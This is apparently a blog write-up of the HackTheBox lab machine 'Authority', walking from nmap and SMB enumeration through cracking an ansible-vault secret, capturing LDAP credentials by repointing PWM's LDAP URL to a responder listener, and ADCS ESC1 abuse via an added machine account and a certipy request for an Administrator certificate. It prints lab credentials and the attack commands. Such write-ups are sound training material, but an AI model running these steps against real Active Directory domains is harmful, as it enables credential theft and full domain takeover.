---
title: HTB-Authority
published: 2026-01-25
toc: true
draft: false
tags:
  - ADCS
  - ESC1
  - ansible-vault
  - smbclientng
---

```
Scope:
10.129.229.56
```

# Recon
## Nmap

```bash
sudo nmap -sC -sV -sT -p- -Pn -T5 --min-rate=5000 -vvvv authority.htb

PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2026-01-25 19:23:21Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-01-25T19:24:18+00:00; +4h00m02s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA/domainComponent=htb
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-01-25T19:24:18+00:00; +4h00m02s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA/domainComponent=htb
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-01-25T19:24:18+00:00; +4h00m02s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA/domainComponent=htb
3269/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA/domainComponent=htb
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8443/tcp open  ssl/http syn-ack Apache Tomcat (language: en)
| ssl-cert: Subject: commonName=172.16.2.118
| Issuer: commonName=172.16.2.118
|_http-title: Site doesnt have a title (text/html;charset=ISO-8859-1).
|_http-favicon: Unknown favicon MD5: F588322AAF157D82BB030AF1EFFD8CF9
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| tls-alpn: 
|_  h2
|_ssl-date: TLS randomness does not represent time
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49673/tcp open  msrpc         syn-ack Microsoft Windows RPC
49694/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49695/tcp open  msrpc         syn-ack Microsoft Windows RPC
49697/tcp open  msrpc         syn-ack Microsoft Windows RPC
49698/tcp open  msrpc         syn-ack Microsoft Windows RPC
49706/tcp open  msrpc         syn-ack Microsoft Windows RPC
49714/tcp open  msrpc         syn-ack Microsoft Windows RPC
57175/tcp open  msrpc         syn-ack Microsoft Windows RPC
64088/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 5733/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 63830/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 45641/udp): CLEAN (Failed to receive data)
|   Check 4 (port 63196/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 4h00m01s, deviation: 0s, median: 4h00m01s
| smb2-time: 
|   date: 2026-01-25T19:24:09
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
```

## Enum4linux-ng

Using a random username I enumerated the system:

![](attachments/8a874d44fd1ab2260990eb630891c4cc.png)

Further down I found that I was able to enumerate the shares:

![](attachments/4396ea0ff24972d2a98221fe5508886f.png)

I am able to READ **Development**.

## 445/TCP - SMB
### smbclientng

I was able to log in as a guest user.

![](attachments/0abec20dfd5095fa3da3346759dfd4ac.png)

Inside I found the following:

![](attachments/b61fc40221ed52f5ccd80dfc9143973b.png)

Scrolling down I found the following:

![](attachments/9b44edbeeea6330d6ae66eece4abdc20.png)

![](attachments/dba6c759dfc8e21f344b18889708cec0.png)

```
admin 
T0mc@tAdm1n

robot
T0mc@tR00t
```

Furthermore I found the following:

![](attachments/5fc92484fef6e20c8092181ab7e2203c.png)

```
administrator
Welcome1
```

And lastly I found the **pwm** admin password:

![](attachments/2a4546a08d80ece093207d242ea4098a.png)

```
root
password
```

## 8443/TCP - HTTPS

![](attachments/8ea06e90ae1e58c337a0d5e0f292a5b5.png)

I land on the login page where I can enter the found creds.

![](attachments/a80f340c81bb4e5a9836fa4a621ba822.png)

However I get the following error:

![](attachments/9116f5bae39e447512ec1c47999e166b.png)

That means this password is HIGHLY LIKELY incorrect and we'll thus need to find another one.

### ansible-vault

Heading back over to smb share I find the `ansible` vault passwords:

![](attachments/ca306048c4b35a1cfa1fdd2c07e8e250.png)

In order to crack it we can use `ansible-vault`:

![](attachments/857ca095d2181f87ae19bb9ec98320b2.png)

I then save these hashes and attempt to crack them:

![](attachments/5bfbfd05e4a6d46fde455b7fb78c88d3.png)

```
!@#$%^&*
```

We can now use the `ansible-vault` to view the contents by decrypting the contents with the cracked password:

![](attachments/0de1bdb07a1d3b66bd874b90e084bceb.png)

![](attachments/6697c9e72a1f4d8635eb51aa72f5c77a.png)

```
svc_pwm
pWm_@dm!N_!23
DevT3st@123
```

It seems the `pwm_admin_password` is the second one so let's try to log in with it.

![](attachments/d14a20ef1fda9c97260632d94a026623.png)

I then proceeded to download the configuration

![](attachments/be62098267abfe3439ab4013bd4abee1.png)

Which contained the configuration password hash:

![](attachments/29cd50606e7806d4e20a4f9adcf86bc0.png)

I also happened to find the *svc_ldap* proxy user as well as the proxy password hash:

![](attachments/4ee657a3737405f9c5004a329d340e90.png)

### configuration editor

While I tried cracking these hashes it did not seem to work so I instead headed over to the **Configuration Editor**:

![](attachments/09725b70b29c5f7c84f963fac86875bf.png)

Next up I headed over to the following tab:

![](attachments/4f1b15def83b60e6ce4c1a89bf3dbee4.png)

Here I modified the **LDAP URLs** parameter to my own:

![](attachments/0ffd8b422cedfac4c9ddf815e0d6c79a.png)

![](attachments/d9be093132d45c6ed8b5a7347fdfe58b.png)

Next up I launched `responder` and clicked the **Test LDAP Profile** button.

![](attachments/8cddfad60e82105df41e417f94282bd8.png)

This gave me a cleartext credentialled output:

![](attachments/75431ddcd0f123ccc31a61a0674f300b.png)

```
svc_ldap
lDaP_1n_th3_cle4r!
```

## BloodHound

I then used this account in order to fetch `bloodhound` data:

![](attachments/ffeacc1b98472122b6866429553214ca.png)

I ingested it into `bloodhound` and checked out the results. Unfortunately the results were quite depressing, although I did have remote management access:

![](attachments/07d2d12a31f93facade2b930ae76aac3.png)

# Foothold
## Shell as svc_ldap

![](attachments/da8ea23ae20106de5d66b5200e1a001a.png)

### user.txt

![](attachments/b8c7b83fe96cedcbb3f6cfa0b44e362c.png)

I tried to enumerate the system but did not find anything of use so instead checked out the Certificate Services.

# Privilege Escalation
## ADCS - ESC1

Using `certipy-ad` I checked out the vulnerable templates.

![](attachments/64d43c9285d7661c168bbf35fba5a151.png)

Looks like we have enrollment rights over **CorpVPN**:

![](attachments/0e2b0e72f4934768ecfa82f9b2a2bc3b.png)

Furthermore we see an **Enrollable Principal**:

![](attachments/d8a89ebb9d7b5556c3b5c60df3973368.png)

### Domain Computers Enrollable

We can exploit the enrollable principal by adding a malicious machine account using `powerview`:

```bash
powerview authority.htb/'svc_ldap':'lDaP_1n_th3_cle4r!'@10.129.229.56

Add-ADComputer -ComputerName hacked -ComputerPass P@ssword123
```

![](attachments/feb5cbd78527ce589d1027ca14538627.png)

I can now request the Administrator certificate:

```bash
certipy-ad req -dc-ip 10.129.229.56 -u 'hacked$' -p 'P@ssword123' -ca AUTHORITY-CA -template CorpVPN -upn Administrator
```

![](attachments/bbe89676b9dc86e05dc6d237387356fb.png)

For persistence I will modify the password as well:

![](attachments/7f0bf7f192d495657d62ac73c9366f83.png)

### root.txt 

At last I get access as *Administrator* and get the root flag.

![](attachments/890e95cd2198ca3048a486b57722eb59.png)

![](attachments/e3fcdf0a19a6a0dffc354dd224c98a5a.png)

---
